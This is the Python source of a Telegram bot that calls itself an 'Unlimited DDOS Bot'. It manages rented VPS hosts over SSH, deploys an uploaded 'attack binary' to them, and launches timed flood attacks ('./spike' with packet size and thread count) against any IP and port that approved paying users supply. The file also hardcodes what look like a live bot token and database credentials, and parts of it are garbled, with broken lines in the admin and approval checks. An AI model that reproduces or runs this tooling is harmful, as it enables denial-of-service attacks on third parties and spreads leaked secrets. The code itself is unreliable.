import logging
import datetime
import asyncio
import os
import asyncssh
import telegram
from telegram.ext import filters
from pymongo import MongoClient
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
from bson import Binary
# Track active attack status
attack_running = False
current_time = datetime.datetime.now(datetime.UTC)

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Telegram API & MongoDB credentials
TELEGRAM_BOT_TOKEN = "6982857776:AAFDG6KtTz4T6jYjeZiwFdqZgTpqSW8Mj3Y"
MONGO_URI = "mongodb+srv://jonny:ranbal1@jonny.wwfqv.mongodb.net/?retryWrites=true&w=majority&appName=jonny"
DB_NAME = "TEST"



# Database setup
client = MongoClient(MONGO_URI)
db = client[DB_NAME]
vps_collection = db["vps_list"]
aws_vps_collection = db["aws_vps_list"]
approved_users_collection = db["approved_users"]
settings_collection = db["settings"]
admins_collection = db["admins"]

# Initial owner ID
OWNER_USER_ID = 5759284972

# Ensure owner is in admins collection
if not admins_collection.find_one({"user_id": OWNER_USER_ID}):
    admins_collection.insert_one({"user_id": OWNER_USER_ID, "expiry": datetime.datetime.max})

SSH_SEMAPHORE = asyncio.Semaphore(100)
PEM_FILE_DIR = "./pem_files/"
os.makedirs(PEM_FILE_DIR, exist_ok=True)
BINARY_FILE_DIR = "./binaries/"
os.makedirs(BINARY_FILE_DIR, exist_ok=True)

# Helper functions
def is_owner(user_id):
    return user_id == OWNER_USER_ID

def is_admin(user_id):
    admin = admins_collection.find_one({"user_ user_id})
    if admin and "expiry" in admin:
        current_time = datetime.datetime.utcnow()
        if admin["expiry"] > current_time:
            return True
        else:
            admins_collection.delete_one({"user_id": user_id})
    return False

def is_approved(user_id):
    user_approval = approved_users_collection.find_one({"user_id": user_id})
    if user_approval and "expiry" in user_approval:
        current_time = datetime.datetime.id":utcnow()
        if user_approval["expiry"] >= current_time:
            return True
        else:
            approved_users_collection.delete_one({"user_id": user_id})
    return False

def is_vps_on_cooldown(vps_ip, vps_type):
    collection = vps_collection if vps_type == "regular" else aws_vps_collection
    vps = collection.find_one({"ip": vps_ip})
    if vps and "cooldown_until" in vps:
        current_time = datetime.datetime.utcnow()
        return vps["cooldown_until"] > current_time
    return False

def set_vps_cooldown(vps_ip, vps_type, duration):
    collection = vps_collection if vps_type == "regular" else aws_vps_collection

    cooldown_until = datetime.datetime.utcnow() + datetime.timedelta(seconds=0)
    
    if duration > 0:  # Ensure cooldown is only set if attack was successful
        collection.update_one({"ip": vps_ip}, {"$set": {"cooldown_until": cooldown_until}}, upsert=True)
        logger.info(f"Cooldown set for {vps_ip} ({vps_type}) until {cooldown_until}")
    else:
        logger.warning(f"Skipping cooldown for {vps_ip} ({vps_type}) because attack duration was 0")

async def check_vps_alive(vps_data, vps_type):
    async with SSH_SEMAPHORE:
        try:
            if vps_type == "aws" and "pem_file" in vps_data:
                conn = await asyncio.wait_for(
                    asyncssh.connect(
                        vps_data["ip"],
                        port=vps_data.get("ssh_port", 22),  # Use custom port if provided, else default to 22
                        username=vps_data["username"],
                        client_keys=[vps_data["pem_file"]],
                        known_hosts=None
                    ),
                    timeout=5
                )
            else:
                conn = await asyncio.wait_for(
                    asyncssh.connect(
                        vps_data["ip"],
                        port=vps_data.get("ssh_port", 22),  # Use custom port if provided, else default to 22
                        username=vps_data["username"],
                        password=vps_data["password"],
                        known_hosts=None
                    ),
                    timeout=5
                )
            await conn.close()
            return True
        except (asyncssh.Error, asyncio.TimeoutError):
            return False

# Start command
# Start command
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check user role
    if is_owner(user_id):
        role = "👑 *OWNER*"
    elif is_admin(user_id):
        role = "🛠 *ADMIN*"
    elif is_approved(user_id):
        role = "✅ *APPROVED USER*"
    else:
        role = "🚫 *UNAUTHORIZED USER*"

    # Custom welcome message based on role
    message = f"""
🔥 *Welcome to Unlimited DDOS Bot!* 🔥

👤 *Your Role:* {role}  
📌 Use `/help_cmd` to see all available commands.

⚠️ *Note:* Unauthorized users cannot run attacks.
    """

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if is_owner(user_id):
        message = (
            "All Available Commands:\n\n"
            "/start - Start the bot\n"
            "/add_vps <ip> <ssh_port> <username> <password> - Add a VPS\n"
            "/add_aws_vps <ip> <username> <pem_filename> - Add an AWS VPS\n"
            "/attack <target_ip> <port> <duration> - Launch attack\n"
            "/vps_status - Check VPS status\n"
            "/upload_pem - Upload PEM file\n"
            "/upload_binary - Upload attack binary\n"
            "/setup - Deploy binary on all VPS\n"
            "/add_user <telegram_id> <days_valid> - Approve a user\n"
            "/remove_user <telegram_id> - Remove a user\n"
            "/list_users - Show approved users\n"
            "/remove_vps <vps_ip> - Remove a VPS\n"
            "/PKT - Configure packet size\n"
            "/THREAD - Configure thread count\n"
            "/add_admin <telegram_id> <days_valid> - Add an admin (owner only)\n"
            "/remove_admin <telegram_id> - Remove an admin (owner only)\n"
            "/list_admins - Show admins (owner only)\n"
            "/help_cmd - Show this help message"
        )
    elif is_admin(user_id):
        message = (
            "Admin Commands:\n\n"
            "/start - Start the bot\n"
            "/attack <target_ip> <port> <duration> - Launch attack\n"
            "/help_cmd - Show this help message\n"
            "/add_user <telegram_id> <days_valid> - Approve a user\n"
            "/remove_user <telegram_id> - Remove a user\n"
            "/list_users - Show approved users"
        )
    else:
        message = (
            "User Commands:\n\n"
            "/start - Start the bot\n"
            "/attack <target_ip> <port> <duration> - Launch attack (if approved)\n"
            "/help_cmd - Show this help message"
        )

    await context.bot.send_message(chat_id, text=message)


# Add admin command
async def add_admin(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Sirf owner admins add kar sakta hai!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) != 2:
        await context.bot.send_message(chat_id, "⚠️ *Usage: /add_admin <telegram_id> <days_valid>*", parse_mode="Markdown")
        return

    try:
        new_admin_id = int(args[0])
        days_valid = int(args[1])
    except ValueError:
        await context.bot.send_message(chat_id, "⚠️ *Galat Telegram ID ya days_valid!*", parse_mode="Markdown")
        return

    expiry_date = datetime.datetime.utcnow() + datetime.timedelta(days=days_valid)
    admins_collection.update_one(
        {"user_id": new_admin_id},
        {"$set": {"user_id": new_admin_id, "expiry": expiry_date}},
        upsert=True
    )
    await context.bot.send_message(chat_id, f"✅ *Admin {new_admin_id} approved for {days_valid} days!*", parse_mode="Markdown")

# Remove admin command
async def remove_admin(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Sirf owner admins remove kar sakta hai!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id, "⚠️ *Usage: /remove_admin <telegram_id>*", parse_mode="Markdown")
        return

    try:
        admin_id_to_remove = int(args[0])
    except ValueError:
        await context.bot.send_message(chat_id, "⚠️ *Galat Telegram ID!*", parse_mode="Markdown")
        return

    if admin_id_to_remove == OWNER_USER_ID:
        await context.bot.send_message(chat_id, "❌ *Owner khud ko remove nahi kar sakta!*", parse_mode="Markdown")
        return

    result = admins_collection.delete_one({"user_id": admin_id_to_remove})
    if result.deleted_count > 0:
        await context.bot.send_message(chat_id, f"✅ *Admin {admin_id_to_remove} successfully remove kar diya gaya!*", parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id, f"⚠️ *Admin {admin_id_to_remove} nahi mila!*", parse_mode="Markdown")

# List admins command
async def list_admins(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Sirf owner admins ki list dekh sakta hai!*", parse_mode="Markdown")
        return

    admins = list(admins_collection.find())
    if not admins:
        await context.bot.send_message(chat_id, "📋 *Koi admins nahi hain!*", parse_mode="Markdown")
        return

    message = "*✅ Admin List:*\n\n"
    for admin in admins:
        admin_id = admin.get("user_id", "Unknown")
        expiry = admin.get("expiry", "Unknown")
        if expiry != "Unknown":
            expiry = expiry.strftime("%Y-%m-%d %H:%M:%S UTC")
        message += f"👤 *Admin ID:* `{admin_id}` | ⏳ *Expires:* `{expiry}`\n"
    await context.bot.send_message(chat_id, text=message, parse_mode="Markdown")

# PKT command (owner only)
async def pkt_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Only owner can configure packet size!*", parse_mode="Markdown")
        return

    keyboard = [
        [InlineKeyboardButton("AWS Packet Size", callback_data="aws_pkt_size")],
        [InlineKeyboardButton("Normal Packet Size", callback_data="normal_pkt_size")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id, "📏 *Select Packet Size to Configure:*", parse_mode="Markdown", reply_markup=reply_markup)

# THREAD command (owner only)
async def thread_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Only owner can configure thread count!*", parse_mode="Markdown")
        return

    keyboard = [
        [InlineKeyboardButton("AWS Thread Count", callback_data="aws_thread")],
        [InlineKeyboardButton("Normal Thread Count", callback_data="normal_thread")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id, "🧵 *Select Thread Count to Configure:*", parse_mode="Markdown", reply_markup=reply_markup)

# Callback query handler for PKT and THREAD (owner only)
async def handle_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    chat_id = query.message.chat_id
    user_id = query.from_user.id

    if not is_owner(user_id):
        await query.answer("❌ You are not authorized!", show_alert=True)
        return

    config_type = query.data
    context.user_data["config_type"] = config_type
    await query.answer()
    await context.bot.send_message(chat_id, f"📝 *Enter the value for {config_type} (numeric only):*", parse_mode="Markdown")

# Handle text input for configuration (owner only)
async def handle_config_input(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    text = update.message.text

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Only owner can configure settings!*", parse_mode="Markdown")
        return

    config_type = context.user_data.get("config_type")
    if not config_type:
        await context.bot.send_message(chat_id, "⚠️ *Pehle /PKT ya /THREAD use karein!*", parse_mode="Markdown")
        return

    try:
        value = int(text)
        if value <= 0:
            await context.bot.send_message(chat_id, "❌ *Value positive hona chahiye!*", parse_mode="Markdown")
            return
    except ValueError:
        await context.bot.send_message(chat_id, "❌ *Sirf numeric value enter karein!*", parse_mode="Markdown")
        return

    settings_collection.update_one(
        {"name": config_type},
        {"$set": {"value": value}},
        upsert=True
    )
    await context.bot.send_message(chat_id, f"✅ *{config_type} set to {value} successfully!*", parse_mode="Markdown")
    context.user_data.pop("config_type", None)

# VPS status command
async def vps_status(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Only owner can check VPS status!*", parse_mode="Markdown")
        return

    vps_list = list(vps_collection.find({"user_id": user_id}))
    aws_vps_list = list(aws_vps_collection.find({"user_id": user_id}))

    if not vps_list and not aws_vps_list:
        await context.bot.send_message(chat_id, "❌ *No VPS configured!* Use /add_vps or /add_aws_vps.", parse_mode="Markdown")
        return

    message = "*🔧 VPS Status:*\n\n"
    
    tasks = [check_vps_alive(vps, "regular") for vps in vps_list]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for vps, result in zip(vps_list, results):
        ip = vps.get("ip", "Unknown")
        ssh_port = vps.get("ssh_port", 22)  # Show SSH port
        username = vps.get("username", "Unknown")
        cooldown = "On Cooldown" if is_vps_on_cooldown(ip, "regular") else "Ready"
        alive_status = "Alive" if result is True else "Dead"
        message += f"🌍 *VPS:* `{ip}` | 🔌 *SSH Port:* `{ssh_port}` | 👤 *User:* `{username}` | ⏳ *Cooldown:* `{cooldown}` | 💡 *Status:* `{alive_status}`\n"

    tasks = [check_vps_alive(vps, "aws") for vps in aws_vps_list]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for vps, result in zip(aws_vps_list, results):
        ip = vps.get("ip", "Unknown")
        username = vps.get("username", "Unknown")
        pem_path = vps.get("pem_file", "Unknown")
        pem_filename = os.path.basename(pem_path) if pem_path != "Unknown" else "Unknown"
        cooldown = "On Cooldown" if is_vps_on_cooldown(ip, "aws") else "Ready"
        alive_status = "Alive" if result is True else "Dead"
        message += f"☁️ *AWS VPS:* `{ip}` | 👤 *User:* `{username}` | 🔑 *PEM:* `{pem_filename}` | ⏳ *Cooldown:* `{cooldown}` | 💡 *Status:* `{alive_status}`\n"

    await context.bot.send_message(chat_id, text=message, parse_mode="Markdown")



# Attack command with countdown timer
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    global attack_running
    # Authorization check
    if not (is_admin(user_id) or is_approved(user_id)):
        await context.bot.send_message(chat_id, "❌ You are not approved to use this command. Contact the admin.", parse_mode="Markdown")
        return

    if not is_admin(user_id) and is_approved(user_id):
        user_approval = approved_users_collection.find_one({"user_id": user_id})
        current_time = datetime.datetime.utcnow()
        if user_approval["expiry"] < current_time:
            approved_users_collection.delete_one({"user_id": user_id})
            await context.bot.send_message(chat_id, "❌ *Your approval has expired! Contact the admin for renewal.*", parse_mode="Markdown")
            return

    

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id, "⚠️ Usage: /attack <ip> <port> <duration>", parse_mode="Markdown")
        return

    target_ip, port, duration = args
    try:
        port = int(port)
        duration = int(duration)
    except ValueError:
        await context.bot.send_message(chat_id, "⚠️ Port aur duration numbers hone chahiye!", parse_mode="Markdown")
        return

    if duration > 1000:
        await context.bot.send_message(chat_id, "❌ Attack duration 1000 seconds se kam hona chahiye!", parse_mode="Markdown")
        return
    if attack_running:
        await context.bot.send_message(chat_id, "⚠️ An attack is already running! Please wait for it to finish before starting another.", parse_mode="Markdown")
        return

    # ✅ Set attack status to running
    attack_running = True

    vps_list = list(vps_collection.find())
    aws_vps_list = list(aws_vps_collection.find())

    if not vps_list and not aws_vps_list:
        await context.bot.send_message(chat_id, "❌ No proxy available! Contact the admin to add proxy.", parse_mode="Markdown")
        return

    # Filter available VPS (not on cooldown)
    available_vps = [vps for vps in vps_list if not is_vps_on_cooldown(vps["ip"], "regular")]
    available_aws_vps = [vps for vps in aws_vps_list if not is_vps_on_cooldown(vps["ip"], "aws")]

    total_vps = len(available_vps) + len(available_aws_vps)
    if total_vps == 0:
        await context.bot.send_message(chat_id, "❌ Sabhi proxy cooldown pe hain! Thodi der baad try karein.", parse_mode="Markdown")
        return

    aws_pkt_size = settings_collection.find_one({"name": "aws_pkt_size"}) or {"value": 6}
    normal_pkt_size = settings_collection.find_one({"name": "normal_pkt_size"}) or {"value": 1024}
    aws_thread = settings_collection.find_one({"name": "aws_thread"}) or {"value": 900}
    normal_thread = settings_collection.find_one({"name": "normal_thread"}) or {"value": 900}

    # Send initial attack message
    message = await context.bot.send_message(chat_id, f"🔥 Attack started on {target_ip}:{port} using {total_vps} Proxy for {duration} seconds!", parse_mode="Markdown")
    message_id = message.message_id

    # Start attack tasks
    success_count = {"regular": 0, "aws": 0}  # Track successful attacks

    attack_tasks = []
    for vps in available_vps:
        attack_tasks.append(run_ssh_attack(vps, target_ip, port, duration, chat_id, context, "regular", normal_pkt_size["value"], normal_thread["value"], success_count))

    for vps in available_aws_vps:
        attack_tasks.append(run_ssh_attack(vps, target_ip, port, duration, chat_id, context, "aws", aws_pkt_size["value"], aws_thread["value"], success_count))

    # ✅ Run Timer & Attack in Parallel using create_task (NON-BLOCKING)
    asyncio.create_task(update_timer(context, chat_id, message_id, target_ip, port, total_vps, duration))
    asyncio.create_task(run_attack(attack_tasks, available_vps, available_aws_vps, chat_id, context, target_ip, port, total_vps, duration, success_count))

 
    await context.bot.send_message(chat_id, "✅ Attack has been started in the background!", parse_mode="Markdown")
    

async def update_timer(context, chat_id, message_id, target_ip, port, total_vps, duration):
    remaining_time = duration
    while remaining_time > 0:
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"🔥 Attack in progress on {target_ip}:{port} using {total_vps} Proxy - {remaining_time} seconds remaining!",
                parse_mode="Markdown"
            )
        except telegram.error.BadRequest as e:
            if "Message is not modified" not in str(e):
                logger.error(f"Error updating timer: {str(e)}")
        except telegram.error.TimedOut:
            logger.warning("Telegram API timeout while updating timer")
        await asyncio.sleep(1)
        remaining_time -= 1

    # Final update at 0 seconds
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"🔥 Attack on {target_ip}:{port} completed using {total_vps} Proxy!",
            parse_mode="Markdown"
        )
    except telegram.error.BadRequest:
        pass

async def run_attack(attack_tasks, available_vps, available_aws_vps, chat_id, context, target_ip, port, total_vps, duration, success_count):
    global attack_running  # ✅ Ensure attack_running is updated properly
 
    attack_results = await asyncio.gather(*attack_tasks, return_exceptions=True)  # ✅ Attack will now actually run for duration

    # ✅ Apply Cooldown After Attack Finishes
    for vps in available_vps:
        set_vps_cooldown(vps["ip"], "regular", duration)
    for vps in available_aws_vps:
        set_vps_cooldown(vps["ip"], "aws", duration)

    # ✅ Send Final Completion Messages After Attack Finishes
    await context.bot.send_message(chat_id, f"✅ Attack on {target_ip}:{port} has finished using {total_vps} Proxy!", parse_mode="Markdown")

    # ✅ Log Errors if any Attack Tasks Failed
    for result in attack_results:
        if isinstance(result, Exception):
            logger.error(f"Attack task failed: {str(result)}")

    # ✅ Send Success Count Updates
    if success_count["aws"] > 0:
        await context.bot.send_message(chat_id, f"✅ Attack executed successfully on {success_count['aws']} AWS Proxy!", parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id, "⚠️ No successful attacks on AW Proxy!", parse_mode="Markdown")
    
    if success_count["regular"] > 0:
        await context.bot.send_message(chat_id, f"✅ Attack executed successfully on {success_count['regular']} Normal Proxy!", parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id, "⚠️ No successful attacks on Normal Proxy!", parse_mode="Markdown")

    attack_running = False

# Updated run_ssh_attack function
async def run_ssh_attack(vps_data, target_ip, port, duration, chat_id, context, attack_type="regular", pkt_size=1024, thread_count=900, success_count=None):
    async with SSH_SEMAPHORE:
        try:
            if attack_type == "aws" and "pem_file" in vps_data:
                logger.info(f"Connecting to AWS VPS {vps_data['ip']} on port {vps_data.get('ssh_port', 22)}")
                conn = await asyncssh.connect(
                    vps_data["ip"], 
                    port=vps_data.get("ssh_port", 22),
                    username=vps_data["username"], 
                    client_keys=[vps_data["pem_file"]], 
                    known_hosts=None
                )
            else:
                logger.info(f"Connecting to Regular VPS {vps_data['ip']} on port {vps_data.get('ssh_port', 22)}")
                conn = await asyncssh.connect(
                    vps_data["ip"], 
                    port=vps_data.get("ssh_port", 22),
                    username=vps_data["username"], 
                    password=vps_data["password"], 
                    known_hosts=None
                )

            # ✅ Run attack command in background
            command = f"nohup bash -c 'exec -a spike ./spike {target_ip} {port} {duration} {pkt_size} {thread_count}' > attack.log 2>&1 & echo $! > attack_pid.txt"
            result = await conn.run(command, check=False)
            logger.info(f"Executing command on {vps_data['ip']}: {command}")

            # ✅ Wait for attack to complete before returning
            await asyncio.sleep(duration)

            if success_count is not None:
                success_count[attack_type] += 1
            return result

        except asyncssh.Error as e:
            logger.error(f"SSH error on {vps_data['ip']} ({attack_type}): {str(e)}")
            await context.bot.send_message(chat_id, f"❌ SSH error on {vps_data['ip']} ({attack_type}): {str(e)}", parse_mode="Markdown")
        except Exception as e:
            logger.error(f"Unexpected error on {vps_data['ip']} ({attack_type}): {str(e)}")
            await context.bot.send_message(chat_id, f"❌ Unexpected error on {vps_data['ip']} ({attack_type}): {str(e)}", parse_mode="Markdown")
        finally:
            if 'conn' in locals():
                await conn.close()  # Close SSH connection after starting attack


# Other commands
async def add_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await context.bot.send_message(chat_id, "❌ *You are not authorized to add users!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) != 2:
        await context.bot.send_message(chat_id, "⚠️ *Usage: /add_user <telegram_id> <days_valid>*", parse_mode="Markdown")
        return

    new_user_id, days_valid = args
    try:
        new_user_id = int(new_user_id)
        days_valid = int(days_valid)
    except ValueError:
        await context.bot.send_message(chat_id, "⚠️ *Galat Telegram ID ya days_valid!*", parse_mode="Markdown")
        return

    expiry_date = datetime.datetime.utcnow() + datetime.timedelta(days=days_valid)
    approved_users_collection.update_one(
        {"user_id": new_user_id},
        {"$set": {"user_id": new_user_id, "expiry": expiry_date}},
        upsert=True
    )
    await context.bot.send_message(chat_id, f"✅ *User {new_user_id} approved for {days_valid} days!*", parse_mode="Markdown")

async def remove_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await context.bot.send_message(chat_id, "❌ *You are not authorized to remove users!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id, "⚠️ *Usage: /remove_user <telegram_id>*", parse_mode="Markdown")
        return

    try:
        target_user_id = int(args[0])
    except ValueError:
        await context.bot.send_message(chat_id, "⚠️ *Galat Telegram ID!*", parse_mode="Markdown")
        return

    result = approved_users_collection.delete_one({"user_id": target_user_id})
    if result.deleted_count > 0:
        await context.bot.send_message(chat_id, f"✅ *User {target_user_id} has been removed!*", parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id, f"⚠️ *User {target_user_id} was not found!*", parse_mode="Markdown")

async def list_users(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await context.bot.send_message(chat_id, "❌ *You are not authorized to view the user list!*", parse_mode="Markdown")
        return

    users = list(approved_users_collection.find())
    if not users:
        await context.bot.send_message(chat_id, "📋 *No approved users found!*", parse_mode="Markdown")
        return

    message = "*✅ Approved Users:*\n\n"
    for user in users:
        user_id = user.get("user_id", "Unknown")
        expiry = user.get("expiry", "Unknown")
        if expiry != "Unknown":
            expiry = expiry.strftime("%Y-%m-%d %H:%M:%S UTC")
        message += f"👤 *User:* `{user_id}` | ⏳ *Expires:* `{expiry}`\n"
    await context.bot.send_message(chat_id, text=message, parse_mode="Markdown")

# Updated /add_vps with SSH port
async def add_vps(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Only owner can add VPS!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) != 4:
        await context.bot.send_message(chat_id, "⚠️ *Usage: /add_vps <ip> <ssh_port> <username> <password>*", parse_mode="Markdown")
        return

    ip, ssh_port, username, password = args
    try:
        ssh_port = int(ssh_port)  # Ensure SSH port is a valid integer
        if ssh_port < 1 or ssh_port > 65535:
            await context.bot.send_message(chat_id, "❌ *SSH port 1 se 65535 ke beech hona chahiye!*", parse_mode="Markdown")
            return
    except ValueError:
        await context.bot.send_message(chat_id, "⚠️ *SSH port ek valid number hona chahiye!*", parse_mode="Markdown")
        return

    vps_collection.insert_one({"user_id": user_id, "ip": ip, "ssh_port": ssh_port, "username": username, "password": password})
    await context.bot.send_message(chat_id, f"✅ *VPS {ip} added successfully with SSH port {ssh_port}!*", parse_mode="Markdown")

async def add_aws_vps(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Only owner can add AWS VPS!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id, "⚠️ *Usage: /add_aws_vps <ip> <username> <pem_filename>*", parse_mode='Markdown')
        return

    ip, username, pem_filename = args
    aws_vps_collection.insert_one({"user_id": user_id, "ip": ip, "username": username, "pem_file": f"{PEM_FILE_DIR}{pem_filename}"})
    await context.bot.send_message(chat_id, "✅ *AWS VPS added successfully!*", parse_mode='Markdown')

async def upload_pem_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Only owner can upload PEM files!*", parse_mode="Markdown")
        return

    await context.bot.send_message(chat_id, "📂 *Please upload your .pem file now.*", parse_mode="Markdown")

async def handle_pem_upload(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Only owner can upload PEM files!*", parse_mode="Markdown")
        return

    document = update.message.document
    file_name = document.file_name.lower()

    if not file_name.endswith(".pem"):
        await context.bot.send_message(chat_id, "❌ *Use /upload_binary for non-.pem files!*", parse_mode="Markdown")
        return

    file_path = os.path.join(PEM_FILE_DIR, file_name)
    file = await context.bot.get_file(document.file_id)
    await file.download_to_drive(file_path)

    with open(file_path, "rb") as f:
        pem_data = f.read()

    settings_collection.update_one(
        {"name": "pem_file"},
        {"$set": {"pem": Binary(pem_data), "file_name": file_name}},
        upsert=True
    )
    await context.bot.send_message(chat_id, f"✅ *PEM file uploaded and stored in MongoDB!*\n📂 Path: `{file_path}`", parse_mode="Markdown")

async def upload_binary_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Only owner can upload binaries!*", parse_mode="Markdown")
        return

    await context.bot.send_message(chat_id, "📂 *Please upload your binary file now.*", parse_mode="Markdown")

async def handle_binary_upload(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Only owner can upload binaries!*", parse_mode="Markdown")
        return

    document = update.message.document
    if not document:
        await context.bot.send_message(chat_id, "❌ *No document found! Please upload a file.*", parse_mode="Markdown")
        return

    file_name = document.file_name.lower()
    if file_name.endswith(".pem"):
        await context.bot.send_message(chat_id, "❌ *Use /upload_pem for .pem files!*", parse_mode="Markdown")
        return

    file_path = os.path.join(BINARY_FILE_DIR, file_name)
    file = await context.bot.get_file(document.file_id)
    await file.download_to_drive(file_path)

    with open(file_path, "rb") as f:
        binary_data = f.read()

    settings_collection.update_one(
        {"name": "binary_file"},
        {"$set": {"binary": Binary(binary_data), "file_name": file_name}},
        upsert=True
    )
    await context.bot.send_message(chat_id, f"✅ *Binary file uploaded and stored!*\n📂 Path: `{file_path}`", parse_mode="Markdown")

async def setup_vps(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Only owner can setup VPS!*", parse_mode="Markdown")
        return

    vps_list = list(vps_collection.find({"user_id": user_id}))
    aws_vps_list = list(aws_vps_collection.find({"user_id": user_id}))

    if not vps_list and not aws_vps_list:
        await context.bot.send_message(chat_id, "❌ *No VPS configured! Use /add_vps or /add_aws_vps first.*", parse_mode="Markdown")
        return

    binary_doc = settings_collection.find_one({"name": "binary_file"})
    if not binary_doc:
        await context.bot.send_message(chat_id, "❌ *No binary uploaded! Admin must upload it first.*", parse_mode="Markdown")
        return

    binary_data = binary_doc["binary"]
    file_name = binary_doc["file_name"]

    await context.bot.send_message(chat_id, f"🔄 *Deploying {file_name} to VPS instances...*", parse_mode="Markdown")

    tasks = []
    for vps in vps_list:
        tasks.append(deploy_binary(vps, binary_data, file_name, chat_id, context, "regular"))
    for vps in aws_vps_list:
        tasks.append(deploy_binary(vps, binary_data, file_name, chat_id, context, "aws"))

    await asyncio.gather(*tasks)
    await context.bot.send_message(chat_id, "✅ *Setup completed on all VPS servers!*", parse_mode="Markdown")

async def deploy_binary(vps_data, binary_data, file_name, chat_id, context, vps_type):
    async with SSH_SEMAPHORE:
        try:
            if vps_type == "aws" and "pem_file" in vps_data:
                conn = await asyncssh.connect(
                    vps_data["ip"],
                    port=vps_data.get("ssh_port", 22),  # Use custom port if provided, else default to 22
                    username=vps_data["username"],
                    client_keys=[vps_data["pem_file"]],
                    known_hosts=None
                )
            else:
                conn = await asyncssh.connect(
                    vps_data["ip"],
                    port=vps_data.get("ssh_port", 22),  # Use custom port if provided, else default to 22
                    username=vps_data["username"],
                    password=vps_data["password"],
                    known_hosts=None
                )

            await context.bot.send_message(chat_id, f"🚀 *Uploading to {vps_data['ip']} ({vps_type})...*", parse_mode="Markdown")

            async with conn.start_sftp_client() as sftp:
                async with sftp.open(file_name, "wb") as remote_file:
                    await remote_file.write(binary_data)

            await conn.run(f"chmod +x {file_name}", check=True)
            await context.bot.send_message(chat_id, f"✅ *Binary installed on {vps_data['ip']} ({vps_type})!*", parse_mode="Markdown")
        except asyncssh.Error as e:
            await context.bot.send_message(chat_id, f"❌ *Error on {vps_data['ip']} ({vps_type}): {str(e)}*", parse_mode="Markdown")

async def remove_vps(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_owner(user_id):
        await context.bot.send_message(chat_id, "❌ *Only owner can remove VPS!*", parse_mode="Markdown")
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id, "⚠️ *Usage: /remove_vps <vps_ip>*", parse_mode="Markdown")
        return

    vps_ip = args[0]
    result = vps_collection.delete_one({"ip": vps_ip})
    aws_result = aws_vps_collection.delete_one({"ip": vps_ip})

